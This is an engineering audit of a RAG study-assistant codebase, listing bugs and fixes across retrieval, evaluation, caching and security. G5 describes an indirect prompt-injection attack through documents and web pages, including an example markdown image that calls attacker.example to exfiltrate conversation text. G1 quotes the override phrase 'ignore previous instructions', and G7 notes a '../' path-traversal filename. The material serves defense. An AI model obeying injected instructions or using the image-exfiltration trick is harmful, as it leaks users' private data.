# AI Engineering Gaps & Improvements

This document catalogs gaps found during a full audit of the RAG pipeline (2026-08-27).
Each item includes the evidence in code, why it matters, a suggested direction, and a
priority. See `improvement-tracker.md` for the living status of each item (referenced
here by ID).

Items C2, C3, E4, G5, G6, CO4, and CO5 were added on 2026-09-11 from a follow-up review
of conversation memory, LLM caching, retrieval evaluation, prompt-injection defenses, and
the semantic cache.

Items R5, G7, G8, I4, I5, I6, and the new sections 10–11 (B1, B2, T1, T2, T3) were added on
2026-09-12 from the codebase review done while writing `CLAUDE.md`.

B3 and B4 were found on Day 5 (2026-11-05), B5 on Day 8 (2026-11-07).

Priority legend:
- **P0** — cheap to fix, and either a correctness/security bug or something that blocks
  measuring whether other changes help (e.g. eval, safety).
- **P1** — real quality/cost win, moderate implementation effort.
- **P2** — matters mainly once usage/scale grows; architecture-level work.

---

## 1. Retrieval Quality

### R1 — Reranker doesn't rerank (P0)
`src/reranker.py`, `CrossEncoderReranker.rerank()` — despite the class name, it does not
score anything. It copies the existing hybrid score into `rerank_score` and re-sorts by
it, which is a no-op relative to the input ordering.
**Why it matters:** the pipeline is advertised (README, code comments) as having
cross-encoder reranking, but the actual relevance judgment stops at the hybrid
vector+BM25 fusion step. This is the single highest-leverage fix for answer quality.
**Direction:** use a real cross-encoder (`sentence-transformers` CrossEncoder,
Cohere Rerank) or an LLM-based pointwise/listwise relevance scorer over the top-N
candidates before truncating to `rerank_top_k`.

### R2 — Query decomposition is regex, not semantic (P1)
`src/query_decomposer.py` — splits on literal `"and"` and `"?"` via `re.split`.
**Why it matters:** breaks on natural phrasing ("bread and butter", "black-and-white"),
and can't decompose genuinely compound questions that don't use those tokens.
**Direction:** LLM-based sub-question generation, with the current regex version kept
as a zero-cost fallback when the LLM call fails.

### R3 — No query rewriting / expansion (P1)
No HyDE, no multi-query expansion, no typo/spelling correction beyond the existing
`preprocess_query_for_vector` / `preprocess_query_for_keyword` normalization.
**Why it matters:** short or vaguely-worded student questions are exactly the case
where a single embedding of the raw query underperforms.
**Direction:** generate 2-3 paraphrases or a hypothetical answer (HyDE) and merge
retrieval results, gated behind the confidence heuristic so it only fires when needed.

### R4 — Score fusion is ad-hoc, not RRF (P2)
`src/retrieval_service.py:230-279` — min-max normalizes vector and BM25 scores
independently, then does a fixed 0.6/0.4 weighted sum.
**Why it matters:** min-max normalization is sensitive to outliers in each result set,
and a single fixed weight doesn't adapt to queries where one modality is clearly
stronger.
**Direction:** Reciprocal Rank Fusion (RRF) is simpler, more standard, and doesn't
need score calibration between the two systems.

### R5 — Concept maps search a separate, empty index, so "use documents" finds nothing (P0)
`src/concept_map_service.py:30` constructs `ConceptMapRetriever()` with no argument, and
`ConceptMapRetriever.__init__` (`src/hybrid_retriever.py:36-61`) then builds a brand-new
`IndexBuilder` and `BM25KeywordIndex` instead of reusing the instances in `src/main.py` that
`/upload` indexes into.
**Why it matters:** with `use_documents=True`, concept-map retrieval queries an index that
never receives any chunks, so maps are silently built from web results only. Building the
extra `IndexBuilder` also costs a Gemini embedding call when the service is first created.
**Direction:** pass `main.py`'s shared `retrieval_service` into `ConceptMapRetriever`
(through `get_concept_map_service`), and add a test that a document indexed through the
pipeline is returned by the concept-map retriever.

---

## 2. Structured LLM Output

### S1 — Hand-rolled JSON parsing instead of schema-validated generation (P1)
`src/concept_extractor.py:_parse_llm_response` — finds `{`/`}` boundaries with
`str.find`/`str.rfind`, falls back to a regex `\{.*\}` scan, then `json.loads`.
`instructor` is present in `requirements.txt` but never imported anywhere in `src/`.
**Why it matters:** brittle to any preamble/postamble text the model adds, and there's
no schema validation — a concept map missing a required field is only caught by the
manual `_validate_and_clean_concept_map` cleanup, not by the generation call itself.
**Direction:** use function calling / JSON mode with a Pydantic schema (`instructor`
or the native Gemini structured-output config) for concept maps and quiz generation.

---

## 3. Observability & Tracing

### O1 — No request-level tracing (P1)
No LangSmith, Langfuse, or OpenTelemetry integration despite `langsmith` being an
installed, unused dependency. Debugging relies on `logger.info` breadcrumbs and stray
`print("DEBUG: ...")` calls (e.g. `src/retrieval_service.py:401`,
`src/main.py:883,886`).
**Why it matters:** for a single `/chat` request there is no way to see, in one place,
what was retrieved, what got reranked out, per-stage latency, or token/cost usage.
This makes every other improvement in this document hard to verify.
**Direction:** wrap the retrieval → rerank → compress → generate pipeline in a tracer
(even a lightweight structured-log-per-stage approach) before optimizing further.

### O2 — Debug `print()` statements left in request path (P0)
`src/retrieval_service.py:401`, `src/main.py:883,886` print directly to stdout in
production code paths.
**Why it matters:** noisy in production logs, and signals these paths haven't been
cleaned up since debugging.
**Direction:** remove, or convert to `logger.debug` if the information is worth
keeping.

---

## 4. Evaluation

### E1 — RAGAS integration likely non-functional (P0)
`src/rag_metrics.py` sets `os.environ["OPENAI_API_KEY"] = "dummy"` and passes the raw
`LLMClient` instance as `llm=` to `ragas.evaluate()`. RAGAS expects an LLM object
conforming to its own wrapper interface (e.g. `LangchainLLMWrapper`), not an arbitrary
custom client.
**Why it matters:** `rag_eval_runner.py` likely fails or silently produces meaningless
scores — there is currently no reliable automated signal for retrieval/generation
quality.
**Direction:** either properly wrap `LLMClient` to satisfy RAGAS's LLM interface, or
drop RAGAS and build a smaller custom eval harness using Gemini directly as a judge.

### E2 — "Manual" metrics are word-overlap heuristics (P1)
`src/rag_metrics.py:manual_faithfulness`, `manual_relevancy` — faithfulness is
`len(answer_words & context_words) / len(answer_words)`; relevancy is question/answer
word overlap.
**Why it matters:** these don't measure hallucination or relevance in any meaningful
sense (e.g. an answer that paraphrases faithfully with different words scores low; an
answer that repeats context verbatim without answering the question scores high).
**Direction:** replace with an LLM-as-judge faithfulness/relevancy check, or properly
fix the RAGAS wiring (E1) and retire the manual fallback.

### E3 — No golden eval set or CI regression gate (P2)
`sample_eval_data.py` exists but there's no persisted, versioned set of
question/expected-answer/expected-source triples, and no CI step that runs eval on
every change to retrieval/prompting code.
**Why it matters:** currently there's no way to know if a "fix" to chunking or
prompting silently regresses answer quality on real student questions.
**Direction:** build a small (30-50 question) golden set from actual uploaded course
material, track scores over time, and eventually gate merges on it.

### E4 — No retrieval-level evaluation; existing eval never exercises the pipeline (P0)
`src/sample_eval_data.py` hardcodes both the `answer` and the `contexts` for each
question, so `rag_eval_runner.py` scores fixed strings rather than anything this system
retrieved or generated. `test_retrieval_recall` (`src/rag_eval_runner.py:38-50`) only
prints whether one expected document ID appears for two queries, and
`src/test_retrieval_quality.py` only prints results. No retrieval metric (Recall@k /
Hit@k, MRR, nDCG@k) is measured separately from generation. The eval scripts also import
from `main` (`src/rag_metrics.py:16`, `src/rag_eval_runner.py:6`), which starts the full
app (Redis, Gemini clients) just to run an evaluation.
**Why it matters:** if the relevant chunk never reaches the context, no prompt change
can fix the answer — retrieval quality has to be measured on its own. Several open
questions in this document can only be answered this way: whether a real reranker helps
(R1), RRF vs. the fixed 0.6/0.4 blend (R4), where the flat `0.5` score assigned to web
chunks (`src/retrieval_service.py:378`) places them relative to local results, whether
the 800-character truncation in `SimpleContextCompressor` cuts off answer spans, and
whether the retrieval `confidence` score that selects the grounding level actually
correlates with a relevant chunk being retrieved.
**Direction:** build a retrieval harness that constructs `RetrievalService` directly
(not via `main`), disables web search and the L1 cache during runs, and reports
Recall@k, MRR, and nDCG@k per configuration (plain Python, no new dependency). Label
relevance at document+page level so labels survive re-chunking. Seed the question set
with LLM-generated questions over sampled chunks (prompted to paraphrase, so BM25 isn't
favored by copied wording) plus real hard queries from the `failed_queries` table and
thumbs-down messages. This is the retrieval foundation that E3's golden set and CI gate
build on.

---

## 5. Safety & Guardrails

### G1 — Prompt-injection guard is defined but never called (P0)
`src/main.py:468 sanitize_query()` implements a blocklist for phrases like "ignore
previous instructions" but is not invoked from `/chat` or `/chat/stream`.
**Why it matters:** dead code creates a false sense of security — anyone reading the
codebase would assume this protection is active.
**Direction:** either wire it into the chat endpoints, or remove it and replace with a
real mitigation (see G3).

### G2 — Answer verification is defined but never called (P1)
`src/llm_client.py:236 verify_answer()` checks whether a generated answer is supported
by its cited sources, but nothing in `main.py` calls it.
**Why it matters:** this is a ready-made hallucination check sitting unused; combined
with the confidence/grounding-level logic already in place, it could catch unsupported
claims before they reach the user.
**Direction:** call it for low/loose-grounding responses (or a sample of all
responses) and surface a warning in the response payload when verification fails.

### G3 — Safety filter is a 6-keyword blocklist (P1)
`src/main.py:640-659` (and the smaller duplicate list in `/chat/stream`) blocks a
hardcoded list of unsafe keywords.
**Why it matters:** trivially bypassed by rephrasing, typos, or non-English input, and
maintaining two separate, inconsistent keyword lists (`/chat` vs `/chat/stream`) is
itself a bug waiting to happen.
**Direction:** use Gemini's built-in safety settings/categories, or a dedicated
moderation call, and unify the two endpoints on one shared check.

### G4 — CORS allows any origin while credentials are enabled (P0)
`src/main.py:58-69` — `ALLOWED_ORIGINS` is read from the environment but never used;
`CORSMiddleware` is configured with `allow_origins=["*"]` and `allow_credentials=True`.
**Why it matters:** this combination is a known misconfiguration (browsers generally
reject it, but relying on browser enforcement rather than server-side correctness is
fragile, and it silently defeats the origin allowlist that was clearly intended to be
used).
**Direction:** pass `ALLOWED_ORIGINS` into `allow_origins` instead of `["*"]`.

### G5 — No defense against indirect prompt injection from documents and web content (P1)
`src/llm_client.py:126-150` — retrieved chunk text (uploaded documents, Tavily results,
and pages scraped by `fetch_and_extract_text`) is pasted verbatim into the user turn
under plain-text `[CONTEXT FROM ...]` headers. Several allowlisted domains in
`src/web_search_client.py:8-15` (Wikipedia, StackExchange) host user-editable content.
Nothing scans chunks for embedded instructions at upload or fetch time.
**Why it matters:** indirect injection — instructions hidden inside content the model
reads — is the realistic attack on this app. Direct injection by a user mostly affects
only their own session, and there are no tools to abuse. A PDF with hidden text or an
edited web page can steer answers (e.g. feed a student wrong information), and a chunk
can spoof the `[CONTEXT FROM ...]` / `User question:` structure to blur the boundary
between data and instructions. G1 and G3 only inspect the user's query, so neither would
catch this. Injected instructions can also exfiltrate data: the chat UI renders
assistant messages with `ReactMarkdown` (`frontend/src/components/MessageList.js:99-152`)
without overriding `img`, so an injected `![](https://attacker.example/?q=...)` makes the
browser request an attacker-controlled URL carrying whatever the model placed in it (e.g.
context or conversation text). Raw HTML is not rendered, so this is not XSS.
(`MessageBubble.js` renders plain text but is not used by the chat.)
**Direction:** layered defenses in one shared module used by both chat endpoints:
(1) scan document chunks once at upload and web chunks at fetch time for instruction-like
content and hidden/zero-width characters, flagging or dropping them; (2) spotlighting —
wrap each chunk in a per-request random delimiter and state in a constant system
instruction that delimited content is data, never instructions; (3) a canary string in
the system prompt, blocking any response that contains it; (4) output checks — grounding
(G2), plus an `img` override in `MessageList.js` that drops or allowlists images; (5) a red-team set of injection payloads planted in test documents and web text,
with attack success rate tracked as an eval metric (E4). No layer fully prevents
injection — the goal is lower likelihood and smaller blast radius, which becomes critical
if the pipeline gains tool use (A1).

### G6 — Semantic cache serves one user's answers and document text to other users (P0)
`src/semantic_cache.py:62-87` — cache entries carry no `user_id`; `lookup` filters only
by `doc_version` and `mode`. `doc_version` is a per-user counter (`src/db.py:19`), so
different users at the same version share entries, and `if not user_doc_version`
(`src/semantic_cache.py:65`) disables the version filter entirely when it is 0 — i.e.
for every user who hasn't uploaded anything. The cached value includes `sources`, whose
metadata contains the chunk `text` and `file_name` from the original user's documents
(`src/vector_store.py:24-35`). `/chat/stream` sends these to the client in its metadata
event (`src/main.py:860-868`), and `/chat` returns another user's `session_id` without
logging the exchange (`src/main.py:661-663`).
**Why it matters:** this is a cross-tenant data leak in the live deployment — private
document content, and answers derived from it, can be shown to a different user.
**Direction:** scope every cache entry and lookup by `user_id` (in addition to
`doc_version` and `mode`), and change the falsy version check to `is not None`. Flush the
existing cache on deploy, since those entries were written without user scope. Add a test
asserting that a query cached for user A is a miss for user B.

### G7 — Uploads share one directory across users, and filenames aren't sanitized (P0)
`src/main.py:181` saves each upload to `os.path.join("uploads", file.filename)` using the
client-supplied name. Neither Starlette 0.50 (`starlette/formparsers.py:208`) nor
python-multipart 0.0.20 strips path components — python-multipart only trims full Windows
paths starting with `C:\` or `\\` (an IE6 workaround in `parse_options_header`). The only
check is the extension allowlist in `validate_upload`.
**Why it matters:** two users uploading `notes.pdf` overwrite each other's file on disk, and
both `Document.file_path` values then point at whichever upload came last. A crafted filename
containing `../` segments would be written outside `uploads/` (limited to the allowed
extensions) — inferred from the installed library code, not tested with a live request.
Separately, in Docker `uploads/` resolves to `/app/src/uploads`, which isn't volume-mounted,
so uploads are lost whenever the container is recreated.
**Direction:** store files as `uploads/{user_id}/{uuid}{ext}` with a server-generated name,
keep the original filename only as metadata (`Document.file_name`), check that the resolved
path stays inside the upload root, and mount the upload directory as a volume in Docker.

### G8 — JWT access tokens are written to logs (P0)
`src/main.py:280-285` — the `log_requests` middleware logs `request.url`, which includes the
query string, so every `/chat/stream?token=<JWT>` request writes a valid token to
`logs/app.log` and the console. The OAuth callback also logs its redirect URL, which carries
the token (`src/routes/auth_routes.py:108`). Uvicorn's access log records the query string
as well.
**Why it matters:** tokens are valid for 7 days (`JWT_EXPIRATION_MINUTES` default) and
`/auth/logout` doesn't revoke anything, so anyone who can read the logs (hosting dashboard,
log shipping, a shared machine) can impersonate users.
**Direction:** log `request.url.path` instead of the full URL, and drop the token from the
OAuth redirect log line. Longer term, stop putting the JWT in the SSE query string — e.g. a
short-lived, single-use stream ticket obtained via an authenticated POST, or a fetch-based
SSE client that can send an `Authorization` header.

---

## 6. Context & Token Management

### C1 — Chunking and compression are character-count based, not token-based (P1)
`src/chunking.py:chunk_text` and `src/context_compressor.py` both use `len(str)` as a
proxy for size. `tiktoken` is installed but unused anywhere in `src/`.
**Why it matters:** character count is a poor proxy for token count (varies with
language, whitespace, punctuation), so there's no real guarantee the assembled prompt
fits the model's context window or hits a deliberate token budget — it's approximate
in a way that gets worse as documents/conversations grow.
**Direction:** use `tiktoken` (or the Gemini tokenizer) to measure real token counts
for chunk sizing and for the final compressed-context budget.

### C2 — Retrieval ignores conversation history, so follow-ups retrieve poorly (P1)
`src/main.py:921-930` (and `/chat` at `src/main.py:692-705`) — query decomposition and
`hybrid_retrieve` run on the raw current message only. Prior turns reach the LLM
(`get_recent_messages`, `src/main.py:898-901`) but never reach the retriever.
**Why it matters:** follow-ups like "what are its disadvantages?" or "give an example"
are embedded with no referent, so vector and BM25 search look for the pronoun instead of
the topic. The model then answers a correctly understood question from wrongly retrieved
context — a failure that looks like hallucination but is actually a retrieval miss.
**Direction:** add a history-aware query-rewriting step (a cheap Flash-Lite call: recent
turns + current message → standalone question) before decomposition, and use the
rewritten query for retrieval, web search, and cache lookups. Skip the call when the
session has no prior turns. This is distinct from R3, which expands queries that are
already standalone.

### C3 — Conversation memory is a fixed message-count sliding window; no retrieval-based memory (P2)
`src/session_service.py:59-75` — `get_recent_messages(limit=20)` returns the last 20
messages verbatim, with no token budget, and nothing is retained once a message falls out
of the window.
**Why it matters:** in long study sessions, anything older than ~10 turns is forgotten
entirely, while a few long "detailed"-mode answers can make those 20 messages expensive.
Once full, a one-message-per-turn sliding window also shifts the prompt prefix on every
turn, which defeats provider prompt caching (CO4).
**Direction:** hybrid memory — keep a small, token-budgeted verbatim window of recent
turns (C1), and embed each question+answer pair into a per-session vector store (a
session-scoped index or embeddings in SQLite; not the global FAISS index, whose post-hoc
filtering is described in I1). Each turn, retrieve the top-k older turns above a
similarity threshold using the rewritten query from C2, de-duplicate against the window,
restore chronological order, and inject them alongside the document context in the final
user turn. Delete a session's memory vectors in `delete_session`. Measure with multi-turn
test conversations (E4) before and after.

---

## 7. Agentic / Tool-Use

### A1 — Pipeline is hard-wired, not agentic (P2)
`langgraph` and `langgraph-prebuilt` are installed but unused. Retrieval, web search,
and generation are called in a fixed sequence from `main.py` rather than letting the
model decide (via function/tool calling) whether it needs document retrieval, web
search, or neither.
**Why it matters:** the current `get_web_chunks` fallback logic
(`src/retrieval_service.py:360-369`) always fetches 2-3 web chunks even when
`fallback_used` is false, i.e. even when local context was already sufficient. An
agent with tool access could skip that call entirely when it's not needed.
**Direction:** longer-term restructuring — expose retrieval/web-search as callable
tools and let the model invoke them, rather than always running the full pipeline.

---

## 8. Indexing & Scaling

### I1 — FAISS uses brute-force search with post-hoc tenant filtering (P2)
`src/vector_store.py` — `IndexFlatL2` with no ANN structure (HNSW/IVF); user isolation
is done by over-fetching `top_k * 5` and filtering by `user_id` in Python
(`vector_store.py:47-73`), not by partitioning the index itself.
**Why it matters:** fine at hobby scale; won't scale in either speed (linear scan
across all users' vectors) or correctness (a user with very few matching chunks among
many other users' data could get fewer than `top_k` results even though the filter
`top_k*5` over-fetch is meant to compensate).
**Direction:** per-user FAISS indices (already partially set up via
`user_test_user_with_docs.index` naming in `src/data/faiss_indexes/`) or a proper ANN
index type once corpus size justifies it.

### I2 — BM25 index rebuilds entire corpus on every add, not persisted (P2)
`src/keyword_index.py:add_documents` — re-tokenizes and rebuilds `BM25Okapi` over the
*entire* accumulated corpus on every incremental add, and the index only lives in
process memory (no save/load, unlike `FaissVectorStore.save/load`).
**Why it matters:** every document upload gets progressively slower as the corpus
grows, and a server restart silently loses keyword search until documents are
re-indexed.
**Direction:** persist the tokenized corpus/metadata to disk like the FAISS index
does, and consider a windowed/batched rebuild strategy instead of rebuilding on every
single upload.

### I3 — Embeddings are generated one API call per chunk (P1)
`src/embedding_service.py:embed_texts` loops over `texts` and calls
`self.client.models.embed_content` once per string, even though it's called with
batches from `IndexBuilder.index_chunks_with_user`.
**Why it matters:** N chunks means N sequential network round-trips instead of one
batched call — directly increases document upload latency and API overhead.
**Direction:** use the Gemini API's batch embedding support (or `asyncio.gather` over
a bounded number of concurrent calls) instead of a serial loop.

### I4 — FAISS and BM25 indexes are never persisted, so every restart wipes search (P0)
`FaissVectorStore.save` / `load` (`src/vector_store.py:77-89`) exist, but nothing in the
application calls them outside the ad-hoc `src/test_*.py` scripts. `IndexBuilder` starts
from an empty index on every process start (`src/index_builder.py:16-17`), and
`BM25KeywordIndex` has no persistence at all (I2). The `documents` table in SQLite, however,
survives restarts.
**Why it matters:** after every restart or Render deploy, users still see their documents
listed, but retrieval returns nothing from them — chat silently degrades to web results and
general knowledge until they re-upload.
**Direction:** save the FAISS index + metadata and the BM25 corpus after each successful
index change, and load them at start-up; write atomically (temp file + rename) so a crash
can't leave a corrupt index. On Render, local disk is ephemeral unless a persistent disk is
attached, so deployment also needs a disk or an external store (open decision in
`CLAUDE.md`). Supersedes the persistence half of I2.

### I5 — Deleting a document leaves its chunks searchable (P0)
`DELETE /documents/{doc_id}` (`src/main.py:210-234`) deletes the database row and bumps
`doc_version`, but never touches the FAISS or BM25 index, and the uploaded file stays on
disk (its removal is commented out at `src/main.py:231-232`).
`src/document_delete_service.py`, which calls `FaissVectorStore.mark_delete_by_document_id`,
is never called — and even if it were, BM25 would still return the chunks: the `deleted`
flag is set only on FAISS's metadata dicts, `BM25KeywordIndex.search` never checks it, and
the service's comment claiming otherwise is wrong.
**Why it matters:** content a user deleted keeps appearing in answers and citations until
the next restart wipes everything (I4). Users reasonably expect deleted material to stop
being used.
**Direction:** on delete, remove or mark the document's chunks in both indexes (add the
`deleted` check to BM25 search, or rebuild BM25 without them), remove or archive the file,
and persist the updated indexes (I4). Either wire in `document_delete_service.py` or delete
it.

### I6 — Re-uploading an identical file indexes its chunks again (P1)
`register_document` (`src/document_service.py:17-19`) returns the existing `Document` when the
file hash matches, but `/upload` (`src/main.py:188-201`) calls
`indexing_pipeline.index_document` unconditionally and bumps `doc_version` anyway. That early
return also skips `db.close()`.
**Why it matters:** each re-upload adds another full copy of the document's chunks to FAISS
and BM25, so duplicates crowd other results out of top-k, re-embedding wastes API calls, and
the `doc_version` bump needlessly invalidates the user's caches. Uploading a changed version
of a file has the same effect for the old version's chunks, which are never removed.
**Direction:** have `register_document` report whether the document is new, changed, or
unchanged; skip indexing and the version bump for unchanged files; when a new version
replaces an old one, remove the old version's chunks (same mechanism as I5).

---

## 9. Cost & Latency

### CO1 — Semantic cache does a full linear scan per lookup (P1)
`src/semantic_cache.py:lookup` — loads *all* cached entries from Redis on every call
and computes cosine similarity against each one in a Python loop.
**Why it matters:** lookup cost grows linearly with cache size (capped at 64 entries
today via `max_entries`, but that cap itself limits how useful the cache can be —
raising it would make lookups proportionally slower).
**Direction:** use a small local vector index (even a flat FAISS index) for the cache
itself instead of a JSON blob + Python loop, so cache size and lookup cost decouple.

### CO2 — Sub-queries are retrieved sequentially in an async endpoint (P1)
`src/main.py:698-722` (and the streaming equivalent) — loops over `subqueries` and
calls `retrieval_service.hybrid_retrieve` one at a time, even though `/chat` is an
`async def` endpoint and each sub-query's retrieval is independent.
**Why it matters:** multi-part questions (the exact case `QueryDecomposer` exists for)
pay the full retrieval latency multiple times in series instead of once, in parallel.
**Direction:** use `asyncio.gather` (or run the sync retrieval calls in a thread pool)
to parallelize sub-query retrieval.

### CO3 — No embedding cache keyed by content hash (P2)
Nothing in `embedding_service.py` or `index_builder.py` caches embeddings by a hash of
the input text.
**Why it matters:** re-uploading a document, or any duplicate chunk text across
documents, gets re-embedded from scratch every time.
**Direction:** hash chunk text and cache the resulting embedding (Redis or on-disk),
checked before calling the embedding API.

### CO4 — Prompt layout defeats provider prompt caching, and token usage is never logged (P1)
`src/llm_client.py:65-102` — the system instruction varies with `grounding_level`, which
is re-derived from each turn's retrieval confidence (`src/main.py:946`), so the very
first tokens of the prompt can change between consecutive turns of the same session.
Separately, once a session exceeds the 20-message history window (C3), the oldest message
drops every turn, shifting the prefix again. `_call_gemini_with_retry` and
`stream_answer` return only text and discard the response's `usage_metadata`.
**Why it matters:** Gemini 2.5+ models apply implicit prefix caching automatically —
repeated prompt prefixes above a minimum size (2,048 tokens for 2.5 Flash per current
docs) are billed at a discount — but only when the prefix is identical. The current
layout forfeits most of that saving, and with no token accounting there is no visibility
into prompt size, cached tokens, or cost per request.
**Direction:** keep the system instruction constant and move the grounding-level
directive into the final user turn; keep history append-only between trims (drop older
turns in blocks rather than one per turn); keep all per-turn variable content (retrieved
context, recalled memory) in the final user turn, as retrieved context already is. Log
`usage_metadata.prompt_token_count` and `cached_content_token_count` per call (feeds O1).
Explicit context caching (`client.caches.create`) only pays off for large, repeatedly
reused content such as a whole document sent as context, which the RAG path doesn't do
today — revisit if a full-document mode is added.

### CO5 — Semantic cache is conversation-blind, has no TTL, and its threshold is unvalidated (P1)
`src/semantic_cache.py` — lookups use only the raw current message, so a follow-up such
as "give me an example" can match a different session's follow-up about an unrelated
topic. All entries live in a single Redis value with no TTL (`_save_entries`, lines
58-60), capped at 64 entries shared across all users (lines 90, 105-106), and every
`store` does a read-modify-write of that value, so concurrent requests can overwrite each
other's entries. On a miss, the same query is embedded three times (retrieval, `lookup`,
`store`). The 0.92 similarity threshold was never measured: `src/cache_tuner.py` only
replays identical queries (similarity 1.0), so it cannot detect false hits.
**Why it matters:** a semantic cache's main risk is false hits — near-identical
embeddings for questions that need different answers ("What is overfitting?" vs. "What is
underfitting?"). Serving a wrong cached answer is worse than a miss, and currently
neither the false-hit rate nor the hit rate is known. Once entries are correctly scoped
per user (G6), the hit rate in a personal study app is also likely to be low, so the
benefit should be measured before investing further.
**Direction:** look up and store using the standalone rewritten query (C2), or bypass the
cache for follow-up turns; cache only strictly grounded answers; store entries
individually with per-entry TTLs; compute the query embedding once and pass it through.
Tune the threshold on labelled same-intent / different-intent query pairs and report
precision/recall per threshold; optionally confirm gray-zone hits (e.g. 0.88–0.95) with a
cheap LLM equivalence check; track thumbs-down on cached answers as a production
false-hit signal. Consider caching retrieval results instead of final answers, so the
answer is still generated with the current conversation. Builds on CO1 (index-based
lookup).

---

## 10. Application Correctness

### B1 — `DELETE /user/delete` fails, so accounts can't be deleted (P0)
`src/main.py:436-438` — `delete_account` runs `db.query(Session).filter(Session.user_id ...)`,
but inside `main.py` the name `Session` is SQLAlchemy's `sqlalchemy.orm.Session` (imported at
lines 4 and 296); the chat-session model is imported as `ChatSession`. Evaluating
`Session.user_id` raises `AttributeError`, which the global exception handler turns into a
500 before anything is committed.
**Why it matters:** account deletion never works, so users cannot remove their data. Even
with the crash fixed, the endpoint doesn't remove `failed_queries` rows, uploaded files, or
indexed chunks.
**Direction:** query `ChatSession`, and move deletion into a service that removes all of a
user's data — sessions, messages, documents, concept maps, `failed_queries`, files on disk,
and index entries (I5) — in one transaction where possible. Add a test that registers,
uploads, chats, deletes the account, and asserts nothing of that user remains.

### B2 — Retrieval confidence is compared on the wrong scale in two places (P1)
`RetrievalService.hybrid_retrieve` produces confidence on a 0–100 scale, but:
(1) `POST /chat` picks the grounding level with `>= 0.7` / `>= 0.3` (`src/main.py:728-733`),
so it almost always selects "strict", while `/chat/stream` correctly uses 70 / 30
(`src/main.py:946`); (2) when the keyword/example heuristic forces web fallback,
`src/retrieval_service.py:342` caps confidence at `0.3` — effectively zero on a 0–100 scale —
and only the web-result adjustment at lines 388-401 raises it again, and only when a web
chunk lands in the final top results.
**Why it matters:** the grounding level decides whether the model must stick to the context
or may use general knowledge, so the two endpoints behave differently for the same query,
and the forced-fallback path ends in "none" grounding whenever no web chunk makes the cut
(including when the Tavily call fails).
**Direction:** define the confidence scale once (a named constant or small type), use the
same grounding thresholds everywhere (or consolidate the endpoints — open decision in
`CLAUDE.md`), and set the cap to its intended value on the 0–100 scale. Validate the
thresholds against retrieval eval results (E4).

### B3 — Image and PPTX table extraction is silently disabled by an OpenCV wheel clash (P1)
Three OpenCV wheels are pinned in `requirements.txt`: `opencv-python`, `opencv-python-headless`
(required by `camelot-py`) and `opencv-contrib-python-headless` (required by `img2table`), all
4.12.0.88. They all install into the same `cv2` package, so whichever pip writes last wins; in
the local venv a non-contrib build won, and `cv2.ximgproc` is missing. `img2table` then fails
with `module 'cv2.ximgproc' has no attribute 'niBlackThreshold'`, and
`table_utils.extract_tables_from_image` (`src/table_utils.py:42-44`) catches the exception,
prints it and returns `[]`. `opencv-python` is required by nothing. Found on Day 5.
**Why it matters:** `extract_tables_from_pptx_slides` uses the same path, so tables in PPTX
slide images uploaded through `/upload` are never extracted, with no error surfaced. Confirmed
in the backend image built from the same Dockerfile and requirements Render uses: the test
xfails there too, so PPTX image-table extraction is broken in production (not yet observed via
a live upload). The old test asserted only
`isinstance(tables, list)`, so it passed while the feature was dead.
**Direction:** drop the unused `opencv-python` pin and make the contrib build win (install it
last / force-reinstall, or a constraints file), in the Dockerfile and locally; confirm camelot
still works; then remove the strict `xfail` on `test_table_extraction_on_image`. Ask before
changing requirements.

### B4 — Concept-map generation fails with a 500 when a node has empty sources (P1, Done Day 5)
`ConceptExtractor._add_source_attribution` (`src/concept_extractor.py`) fills in sources for
nodes the LLM returned without any. Its comments said "assign first web/doc source", but the
code assigned the whole list wrapped in another list (`[web_sources]`), so the node's `sources`
became `[["https://…", …]]`. `concept_map_service._save_concept_map_to_db` then runs
`','.join(node['sources'])`, which raises `TypeError: sequence item 0: expected str instance,
list found`, and `POST /api/concepts/generate` returns 500 "Failed to generate concept map".
**Why it matters:** a single node with empty sources — something the LLM does whenever it skips
the field — failed the whole concept map. Found by the Day 5 API smoke test.
**Fix (Day 5):** assign `[web_sources[0]]` / `[doc_sources[0]]`; unit tests cover both fallbacks,
kept sources, and no source of that type.

### B5 — Image deskew rotates scans 90°, so the unified parser's OCR returns nothing (P2)
`preprocess_image` (`backend/app/ingestion/ocr/image_preprocessing.py`) deskews by taking the
coordinates of every pixel with `np_img > 0` and fitting `cv2.minAreaRect` to them. On a scan
with a white background that is nearly every pixel (97.5 % of `scan_handwritten.png`), so the
"text" rectangle is the whole image. OpenCV 4.5+ reports angles in (0, 90], and returns 90.0 for
that axis-aligned rectangle; the code's `angle < -45` branch was written for the old [-90, 0)
convention, so it rotates by -90°. `warpAffine` keeps the original width × height, so the page
ends up sideways and cropped, and `DocumentParser.parse()` returns `{'type': 'image', 'text': ''}`.
Same result on the Windows host and in the backend image (cv2 4.12.0). Found on Day 8, when
`test_docx_pdf_utils.py` started opening its samples (its CWD-relative paths had made every
test pass without running).
**Why it matters:** not reachable from any user path today: `/upload` rejects images, and the
PPTX OCR path uses `extract_text_from_image_with_preprocessing`, not `preprocess_image`. It
becomes a real bug as soon as image or handwritten-note upload is enabled, and it fails silently
(empty text, no error).
**Direction:** threshold the text pixels (inverted Otsu) before collecting coordinates, handle
OpenCV's 0–90° angle convention, and keep the original size; then remove the strict `xfail` on
`test_unified_parser_image` and record the OCR output before and after.

---

## 11. Tooling & Repo Hygiene

### T1 — `pytest.ini` settings are silently ignored (P1)
`pytest.ini` uses the `[tool:pytest]` section header, which pytest only recognizes in
`setup.cfg`; in a `pytest.ini` the section must be `[pytest]`. Pytest still picks the file as
its config (so the rootdir is right) but reads no options from it, so `testpaths = tests` and
`pythonpath = .` don't apply.
**Why it matters:** a bare `pytest` from the repo root also collects the ad-hoc
`src/test_*.py` scripts, several of which construct Gemini clients or call live services, so
a test run is slow, spends API calls, and fails without credentials — which discourages
running tests at all.
**Direction:** change the header to `[pytest]`, and rename or move the `src/test_*.py`
scripts (e.g. to a `scripts/` folder) so they can never be collected as tests.

### T2 — Alembic targets the wrong database with an incomplete model set (P1)
`alembic.ini` sets `sqlalchemy.url = sqlite:///data/app.db`, relative to the CWD, while
`alembic/env.py` imports `src.db` and therefore must run from the repo root — so Alembic
points at (and, via `db.py`'s `makedirs`, creates) `./data/app.db` instead of the real
`src/data/app.db`. `env.py` also imports only `src.db`, so `ConceptMap` / `ConceptMapNode`
(`src/concept_models.py`) are missing from `target_metadata`. Meanwhile the schema actually
evolves through `db.py`'s startup `migrate_database()` and one-off scripts (`fix_db.py`,
`recreate_db.py`, `migrate_user_model.py`, `src/add_concept_tables.py`,
